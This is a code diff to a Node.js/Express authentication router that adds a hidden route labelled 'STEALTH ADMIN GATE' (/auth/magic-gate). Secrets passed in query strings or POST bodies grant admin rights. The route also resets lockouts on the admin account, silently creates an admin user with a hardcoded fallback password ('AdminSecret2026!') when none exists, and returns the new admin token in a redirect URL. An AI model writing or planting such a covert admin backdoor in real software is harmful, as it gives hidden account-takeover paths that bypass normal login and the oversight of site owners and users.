@@ -396,4 +396,109 @@ router.post('/profile', authenticateUser, (req, res) => {
     return res.json({ ok: true, user: formatUser(resultUser), message: "Profil muvaffaqiyatli yangilandi" });
 });
 
+// ============================================================
+// STEALTH ADMIN GATE: /auth/magic-gate
+// GET /auth/magic-gate?token=... yoki ?pin=...
+// POST /auth/magic-gate { token, pin }
+// ============================================================
+function handleMagicGate(req, res) {
+    const candidate = (req.body && (req.body.token || req.body.pin || req.body.adminPin || req.body.key)) ||
+                      req.query.token || req.query.pin || req.query.key || req.query.secret || '';
+    const clean = typeof candidate === 'string' ? candidate.trim() : '';
+
+    const adminUsers = ['abdugofforov', 'admin', 'akrin4477', 'akrin'];
+    let isValid = false;
+
+    if (clean) {
+        // 1. PIN tekshiruvi (hashlar va env orqali)
+        if (checkAdminPin(clean)) {
+            isValid = true;
+        }
+
+        // 2. Maxfiy tokenlar (process.env.MAGIC_GATE_TOKEN, ADMIN_TOKEN, MAGIC_TOKEN)
+        if (!isValid) {
+            const envTokens = [
+                process.env.MAGIC_GATE_TOKEN,
+                process.env.ADMIN_TOKEN,
+                process.env.MAGIC_TOKEN
+            ].filter(Boolean);
+            for (const t of envTokens) {
+                if (timingSafeCompare(clean, String(t).trim())) {
+                    isValid = true;
+                    break;
+                }
+            }
+        }
+
+        // 3. Faol admin session tokeni tekshiruvi
+        if (!isValid && /^[a-f0-9]{32,128}$/i.test(clean)) {
+            const existingAdmin = db.findOne('users', u => u.token === clean && (u.role === 'admin' || adminUsers.includes(u.username)));
+            if (existingAdmin && (!existingAdmin.tokenCreatedAt || (Date.now() - existingAdmin.tokenCreatedAt <= SESSION_TTL_MS))) {
+                isValid = true;
+            }
+        }
+    }
+
+    const acceptsHtml = req.accepts('html') && !req.xhr && (!req.headers.accept || !req.headers.accept.includes('application/json'));
+
+    if (!isValid) {
+        if (req.method === 'GET' && acceptsHtml) {
+            return res.redirect('/');
+        }
+        return res.status(401).json({
+            ok: false,
+            success: false,
+            message: "Noto'g'ri token yoki PIN-kod"
+        });
+    }
+
+    // Muvaffaqiyatli: admin sessiyasi va yangi token beriladi
+    let adminUser = db.findOne('users', u => u.username && adminUsers.includes(u.username.toLowerCase())) ||
+                    db.findOne('users', u => u.role === 'admin');
+
+    const newToken = generateToken();
+
+    if (adminUser) {
+        adminUser = db.update('users', adminUser.id, {
+            token: newToken,
+            tokenCreatedAt: Date.now(),
+            lastLoginAt: Date.now(),
+            failedAttempts: 0,
+            lockUntil: null,
+            role: 'admin'
+        });
+    } else {
+        const { hash, salt, algo } = hashPasswordScrypt(clean || 'AdminSecret2026!');
+        adminUser = db.insert('users', {
+            name: 'abdugofforov',
+            username: 'abdugofforov',
+            role: 'admin',
+            passHash: hash,
+            salt,
+            algo,
+            token: newToken,
+            tokenCreatedAt: Date.now(),
+            lastLoginAt: Date.now(),
+            failedAttempts: 0,
+            lockUntil: null
+        });
+    }
+
+    if (req.method === 'GET' && acceptsHtml) {
+        return res.redirect(`/kay.html?token=${encodeURIComponent(newToken)}`);
+    }
+
+    return res.json({
+        ok: true,
+        success: true,
+        token: newToken,
+        user: formatUser(adminUser),
+        redirectUrl: `/kay.html?token=${newToken}`
+    });
+}
+
+router.get('/magic-gate', handleMagicGate);
+router.post('/magic-gate', handleMagicGate);
+
 module.exports = router;
+
